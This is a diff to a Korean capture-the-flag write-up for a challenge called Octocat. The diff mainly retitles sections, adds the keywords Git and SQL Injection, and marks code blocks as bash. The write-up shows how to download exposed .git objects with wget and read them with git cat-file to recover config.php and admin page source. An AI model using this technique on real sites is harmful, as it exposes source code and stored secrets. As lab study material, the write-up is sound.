@@ -4,7 +4,11 @@
 > 코딩, 마크다운 작성 등 다재다능한 문어발 고양이  
 > ^ↀᴥↀ^
 
-## Write-up
+## Keyword
+* Git  
+* SQL Injection
+
+## Solution
 ![Main](img/001.png)  
 메인 페이지에 접근해보면 MarkDown 문법 몇 가지가 소개되어 있고 별다른 기능을 볼 수 없습니다.  
 다른 기능이나 페이지를 더 알아보기 위해서 robots.txt 파일에 접근하여 확인해보면 다음과 같이 /admin 디렉터리가 Disallow 되어 있는 것을 볼 수 있습니다.
@@ -49,20 +53,20 @@ commit 이력을 보면 마지막에 Create admin 되어 있는 부분을 볼 �
 /.git/objects/37/7c0f08d7f0317b18df6d9e8bd956f7940831d9
 
 해당 파일의 정보를 확인하기 위해서 빈 디렉터리를 만든 다음 git init 명령어를 입력하여 임의의 Git 저장소를 만듭니다.  
-```
+```bash
 # git init
 Initialized empty Git repository in /Octocat/.git/
 ```
 
 그리고 7c0f08d7f0317b18df6d9e8bd956f7940831d9 파일을 다운로드 받아서 .git/objects/ 디렉터리에 동일한 형태로 추가합니다.  
-```
+```bash
 # wget https://do9.kr/Octocat/.git/objects/37/7c0f08d7f0317b18df6d9e8bd956f7940831d9
 # mkdir .git/objects/37/
 # mv 7c0f08d7f0317b18df6d9e8bd956f7940831d9 .git/objects/37/
 ```
 
 다운받은 파일의 정보를 git cat-file 명령어를 통해 확인할 수 있습니다.  
-```
+```bash
 # git cat-file -p 377c0f08d7f0317b18df6d9e8bd956f7940831d9
 tree 6380e82b43310c73c3fef2236b989c9b1cad4ab6
 parent f731b14ffc633e70888bf639c320464dd2c71920
@@ -73,7 +77,7 @@ Create admin
 ```
 
 확인한 정보에서 tree의 값을 동일한 방법으로 다시 다운로드 받아서 확인합니다.  
-```
+```bash
 # wget https://do9.kr/Octocat/.git/objects/63/80e82b43310c73c3fef2236b989c9b1cad4ab6
 # mkdir .git/objects/63/
 # mv 80e82b43310c73c3fef2236b989c9b1cad4ab6 .git/objects/63/
@@ -85,7 +89,7 @@ Create admin
 ```
 
 중요 정보가 있을 것으로 생각되는 admin의 정보를 얻기 위해 다시 tree의 값을 확인합니다.  
-```
+```bash
 # wget https://do9.kr/Octocat/.git/objects/ca/2bff0667f07de553c49ffcae1ced0ff088b690
 # mkdir .git/objects/ca/
 # mv 2bff0667f07de553c49ffcae1ced0ff088b690 .git/objects/ca/
@@ -95,7 +99,7 @@ Create admin
 ```
 
 config.php 파일의 내용을 확인합니다.  
-```
+```bash
 # wget https://do9.kr/Octocat/.git/objects/9c/7aba35acd0b11b75139d8a8bc82dc6f3efad89
 # mkdir .git/objects/9c/
 # mv 7aba35acd0b11b75139d8a8bc82dc6f3efad89 .git/objects/9c/
@@ -110,7 +114,7 @@ config.php 파일의 내용을 확인합니다.
 
 Flag 값이 있으나 임시 값으로 현재 서버 값과는 다르기 때문에 인증할 수 없는 값입니다.  
 미궁의 /admin/index.php 파일의 내용을 확인합니다.  
-```
+```bash
 # wget https://do9.kr/Octocat/.git/objects/f8/becac1dc52e23d7844a9162b19968e8a1bc356
 # mkdir .git/objects/f8/
 # mv becac1dc52e23d7844a9162b19968e8a1bc356 .git/objects/f8/
